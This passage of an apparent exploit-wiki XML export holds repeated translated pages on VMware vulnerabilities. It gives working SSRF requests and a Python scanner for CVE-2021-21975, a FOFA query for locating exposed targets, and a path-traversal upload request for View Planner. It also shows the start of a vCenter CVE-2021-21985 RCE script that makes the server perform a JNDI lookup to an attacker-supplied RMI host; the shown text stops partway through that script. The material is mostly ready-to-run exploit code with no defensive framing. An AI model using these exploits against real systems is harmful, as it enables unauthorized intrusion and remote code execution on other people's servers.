Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["eheeyd.dnslog.cn"]
&lt;/pre&gt;



&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["127.0.0.1:443/ui"]
&lt;/pre&gt;


==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: VMware vRealize Operations Manager                         \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mDnslog      &gt;&gt;&gt; xxx.dnslog.com                                     \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, v):
    vuln_url = target_url + "/casa/nodes/thumbprints"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8"
    }
    data = '["{}"]'.format(Dnslog)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 :
            print("\033[32m[o] 目标 {} 可能存在SSRF漏洞,请检查 Dnslog 响应 \033[0m".format(target_url, vuln_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl    &gt;&gt;&gt; \033[0m"))
    Dnslog = str(input("\033[35mDnslog &gt;&gt;&gt; \033[0m"))
    POC_1(target_url, Dnslog)
&lt;/pre&gt;

&lt;translate&gt;
==參考== &lt;!--T:4--&gt;
&lt;/translate&gt;

https://mp.weixin.qq.com/s/fAYvOdmZO-daxe5FUI8wQA</text>
      <sha1>ruuag5spze42u9bwrd8oqyuh7h4ralv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21975 VMware vRealize Operations Manager SSRF漏洞/en</title>
    <ns>0</ns>
    <id>4081</id>
    <revision>
      <id>4698</id>
      <timestamp>2021-06-10T03:32:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Vulnerability Impact=="</comment>
      <origin>4698</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3323" sha1="k5tcrkqno2b0lqsmrfwil2o2hc1pxzk" xml:space="preserve">&lt;languages  /&gt;

==Vulnerability Impact==

&lt;pre&gt;
vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0

cloud_foundation: 4.x 3.x

vRealize_suite_lifecycle_manager: 8.x
&lt;/pre&gt;


==FOFA==
&lt;pre&gt;
title="vRealize Operations Manager"
&lt;/pre&gt;


==Exploit==

Send the following request packet:
&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["eheeyd.dnslog.cn"]
&lt;/pre&gt;



&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["127.0.0.1:443/ui"]
&lt;/pre&gt;


==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: VMware vRealize Operations Manager                         \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mDnslog      &gt;&gt;&gt; xxx.dnslog.com                                     \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, v):
    vuln_url = target_url + "/casa/nodes/thumbprints"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8"
    }
    data = '["{}"]'.format(Dnslog)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 :
            print("\033[32m[o] 目标 {} 可能存在SSRF漏洞,请检查 Dnslog 响应 \033[0m".format(target_url, vuln_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl    &gt;&gt;&gt; \033[0m"))
    Dnslog = str(input("\033[35mDnslog &gt;&gt;&gt; \033[0m"))
    POC_1(target_url, Dnslog)
&lt;/pre&gt;

==Reference==

https://mp.weixin.qq.com/s/fAYvOdmZO-daxe5FUI8wQA</text>
      <sha1>k5tcrkqno2b0lqsmrfwil2o2hc1pxzk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21975 VMware vRealize Operations Manager SSRF漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4963</id>
    <revision>
      <id>5703</id>
      <timestamp>2021-06-24T02:01:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞利用=="</comment>
      <origin>5703</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3307" sha1="6zctlyyorqw4s3c6tafw642wc1zcwo9" xml:space="preserve">&lt;languages  /&gt;

==漏洞影响==

&lt;pre&gt;
vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0

cloud_foundation: 4.x 3.x

vRealize_suite_lifecycle_manager: 8.x
&lt;/pre&gt;


==FOFA==
&lt;pre&gt;
title="vRealize Operations Manager"
&lt;/pre&gt;


==漏洞利用==

发送如下请求包：
&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["eheeyd.dnslog.cn"]
&lt;/pre&gt;



&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["127.0.0.1:443/ui"]
&lt;/pre&gt;


==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: VMware vRealize Operations Manager                         \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mDnslog      &gt;&gt;&gt; xxx.dnslog.com                                     \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, v):
    vuln_url = target_url + "/casa/nodes/thumbprints"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8"
    }
    data = '["{}"]'.format(Dnslog)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 :
            print("\033[32m[o] 目标 {} 可能存在SSRF漏洞,请检查 Dnslog 响应 \033[0m".format(target_url, vuln_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl    &gt;&gt;&gt; \033[0m"))
    Dnslog = str(input("\033[35mDnslog &gt;&gt;&gt; \033[0m"))
    POC_1(target_url, Dnslog)
&lt;/pre&gt;

==参考==

https://mp.weixin.qq.com/s/fAYvOdmZO-daxe5FUI8wQA</text>
      <sha1>6zctlyyorqw4s3c6tafw642wc1zcwo9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21975 VMware vRealize Operations Manager SSRF漏洞/zh-hans</title>
    <ns>0</ns>
    <id>3183</id>
    <revision>
      <id>3692</id>
      <timestamp>2021-05-31T01:55:18Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "漏洞利用"</comment>
      <origin>3692</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3295" sha1="palpnacfoo70b0bd228lw2ob7k805jj" xml:space="preserve">&lt;languages  /&gt;

漏洞影响

&lt;pre&gt;
vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0

cloud_foundation: 4.x 3.x

vRealize_suite_lifecycle_manager: 8.x
&lt;/pre&gt;


==FOFA==
&lt;pre&gt;
title="vRealize Operations Manager"
&lt;/pre&gt;


漏洞利用

发送如下请求包：
&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["eheeyd.dnslog.cn"]
&lt;/pre&gt;



&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["127.0.0.1:443/ui"]
&lt;/pre&gt;


==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: VMware vRealize Operations Manager                         \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mDnslog      &gt;&gt;&gt; xxx.dnslog.com                                     \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, v):
    vuln_url = target_url + "/casa/nodes/thumbprints"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8"
    }
    data = '["{}"]'.format(Dnslog)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 :
            print("\033[32m[o] 目标 {} 可能存在SSRF漏洞,请检查 Dnslog 响应 \033[0m".format(target_url, vuln_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl    &gt;&gt;&gt; \033[0m"))
    Dnslog = str(input("\033[35mDnslog &gt;&gt;&gt; \033[0m"))
    POC_1(target_url, Dnslog)
&lt;/pre&gt;

参考

https://mp.weixin.qq.com/s/fAYvOdmZO-daxe5FUI8wQA</text>
      <sha1>palpnacfoo70b0bd228lw2ob7k805jj</sha1>
    </revision>
    <revision>
      <id>3696</id>
      <parentid>3692</parentid>
      <timestamp>2021-05-31T01:57:04Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "参考"</comment>
      <origin>3696</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3299" sha1="h8aatuko6lb7b89526bij0m49bu7dai" xml:space="preserve">&lt;languages  /&gt;

==漏洞影响==

&lt;pre&gt;
vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0

cloud_foundation: 4.x 3.x

vRealize_suite_lifecycle_manager: 8.x
&lt;/pre&gt;


==FOFA==
&lt;pre&gt;
title="vRealize Operations Manager"
&lt;/pre&gt;


漏洞利用

发送如下请求包：
&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["eheeyd.dnslog.cn"]
&lt;/pre&gt;



&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["127.0.0.1:443/ui"]
&lt;/pre&gt;


==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: VMware vRealize Operations Manager                         \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mDnslog      &gt;&gt;&gt; xxx.dnslog.com                                     \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, v):
    vuln_url = target_url + "/casa/nodes/thumbprints"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8"
    }
    data = '["{}"]'.format(Dnslog)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 :
            print("\033[32m[o] 目标 {} 可能存在SSRF漏洞,请检查 Dnslog 响应 \033[0m".format(target_url, vuln_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl    &gt;&gt;&gt; \033[0m"))
    Dnslog = str(input("\033[35mDnslog &gt;&gt;&gt; \033[0m"))
    POC_1(target_url, Dnslog)
&lt;/pre&gt;

参考

https://mp.weixin.qq.com/s/fAYvOdmZO-daxe5FUI8wQA</text>
      <sha1>h8aatuko6lb7b89526bij0m49bu7dai</sha1>
    </revision>
    <revision>
      <id>3698</id>
      <parentid>3696</parentid>
      <timestamp>2021-05-31T01:57:27Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "漏洞影响"</comment>
      <origin>3698</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3307" sha1="6zctlyyorqw4s3c6tafw642wc1zcwo9" xml:space="preserve">&lt;languages  /&gt;

==漏洞影响==

&lt;pre&gt;
vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0

cloud_foundation: 4.x 3.x

vRealize_suite_lifecycle_manager: 8.x
&lt;/pre&gt;


==FOFA==
&lt;pre&gt;
title="vRealize Operations Manager"
&lt;/pre&gt;


==漏洞利用==

发送如下请求包：
&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["eheeyd.dnslog.cn"]
&lt;/pre&gt;



&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["127.0.0.1:443/ui"]
&lt;/pre&gt;


==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: VMware vRealize Operations Manager                         \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mDnslog      &gt;&gt;&gt; xxx.dnslog.com                                     \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, v):
    vuln_url = target_url + "/casa/nodes/thumbprints"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8"
    }
    data = '["{}"]'.format(Dnslog)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 :
            print("\033[32m[o] 目标 {} 可能存在SSRF漏洞,请检查 Dnslog 响应 \033[0m".format(target_url, vuln_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl    &gt;&gt;&gt; \033[0m"))
    Dnslog = str(input("\033[35mDnslog &gt;&gt;&gt; \033[0m"))
    POC_1(target_url, Dnslog)
&lt;/pre&gt;

==参考==

https://mp.weixin.qq.com/s/fAYvOdmZO-daxe5FUI8wQA</text>
      <sha1>6zctlyyorqw4s3c6tafw642wc1zcwo9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21975 VMware vRealize Operations Manager SSRF漏洞/zh-tw</title>
    <ns>0</ns>
    <id>5093</id>
    <revision>
      <id>5833</id>
      <timestamp>2021-06-24T02:31:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "發送如下請求包:"</comment>
      <origin>5833</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3305" sha1="8ydadlj02duz0rya6ya81p1fgh4kjfs" xml:space="preserve">&lt;languages  /&gt;

==漏洞影響==

&lt;pre&gt;
vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0

cloud_foundation: 4.x 3.x

vRealize_suite_lifecycle_manager: 8.x
&lt;/pre&gt;


==FOFA==
&lt;pre&gt;
title="vRealize Operations Manager"
&lt;/pre&gt;


==漏洞利用==

發送如下請求包:
&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["eheeyd.dnslog.cn"]
&lt;/pre&gt;



&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["127.0.0.1:443/ui"]
&lt;/pre&gt;


==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: VMware vRealize Operations Manager                         \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mDnslog      &gt;&gt;&gt; xxx.dnslog.com                                     \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, v):
    vuln_url = target_url + "/casa/nodes/thumbprints"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8"
    }
    data = '["{}"]'.format(Dnslog)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 :
            print("\033[32m[o] 目标 {} 可能存在SSRF漏洞,请检查 Dnslog 响应 \033[0m".format(target_url, vuln_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl    &gt;&gt;&gt; \033[0m"))
    Dnslog = str(input("\033[35mDnslog &gt;&gt;&gt; \033[0m"))
    POC_1(target_url, Dnslog)
&lt;/pre&gt;

==參考==

https://mp.weixin.qq.com/s/fAYvOdmZO-daxe5FUI8wQA</text>
      <sha1>8ydadlj02duz0rya6ya81p1fgh4kjfs</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21978 VMware View Planner logupload RCE漏洞</title>
    <ns>0</ns>
    <id>257</id>
    <revision>
      <id>403</id>
      <timestamp>2021-03-18T09:32:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; ==POC== &lt;pre&gt; POST /logupload?logMetaData={"itrLogPath":"../../../../../etc/httpd/html/wsgi_log_upload","logFileType","log_upload_wsgi.py"} HTTP/1.1 &lt;/pre&gt;"</comment>
      <origin>403</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="169" sha1="54zxae6743drvjzzl2v04apllh0lu72" xml:space="preserve">&lt;languages /&gt;
==POC==
&lt;pre&gt;
POST /logupload?logMetaData={"itrLogPath":"../../../../../etc/httpd/html/wsgi_log_upload","logFileType","log_upload_wsgi.py"} HTTP/1.1
&lt;/pre&gt;</text>
      <sha1>54zxae6743drvjzzl2v04apllh0lu72</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21985 VMware vCenter 遠程任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>3462</id>
    <revision>
      <id>4029</id>
      <timestamp>2021-06-05T01:38:45Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages   /&gt; &lt;translate&gt; ==截圖== &lt;/translate&gt; [[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]   ==EXP== &lt;pre&gt; import requests import sys import json def send_request(host,..."</comment>
      <origin>4029</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2623" sha1="fwlqahq40k1h8nyop2to53v394amqzp" xml:space="preserve">&lt;languages   /&gt;
&lt;translate&gt;
==截圖==
&lt;/translate&gt;
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
